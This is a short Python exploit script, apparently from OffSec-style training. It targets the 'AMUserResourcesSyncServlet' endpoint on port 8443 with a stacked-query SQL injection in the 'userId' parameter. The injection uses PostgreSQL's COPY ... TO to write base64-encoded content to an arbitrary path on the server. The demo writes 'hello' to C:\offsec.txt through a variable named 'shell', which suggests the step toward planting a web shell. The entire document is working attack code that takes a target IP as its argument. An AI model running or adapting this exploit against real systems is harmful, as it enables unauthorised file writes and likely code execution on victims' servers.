import sys, re, os
import base64
import requests
from bs4 import BeautifulSoup
import urllib.parse

def write_to_file(ip, content, filePath):
	print(f"Writing contents into {filePath}......")

	content_base64 = base64.b64encode(content.encode('ascii')).decode('ascii')
	content_encoded = urllib.parse.quote(content_base64)

	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	# proxies = {
	# 	'http': 'http://127.0.0.1:8080',
	# 	'https': 'http://127.0.0.1:8080'
	# }
	# s.proxies.update(proxies)

	userId = f"1;COPY+(SELECT+convert_from(decode($${content_encoded}$$,$$base64$$),$$utf-8$$))+TO+$${filePath}$$;--+"
	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet"
	
	# If use raw data, must specify x-www-form-urlencoded header
	data = f"ForMasRange=1&userId={userId}"
	headers = {
		'Content-Type': 'application/x-www-form-urlencoded'
	}

	r = s.post(target,data=data,headers=headers,verify=False)
	print(r)

def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	shell = "hello"
	filepath = "C:\\offsec.txt"
	write_to_file(ip, shell, filepath)

if __name__ == '__main__':
	main()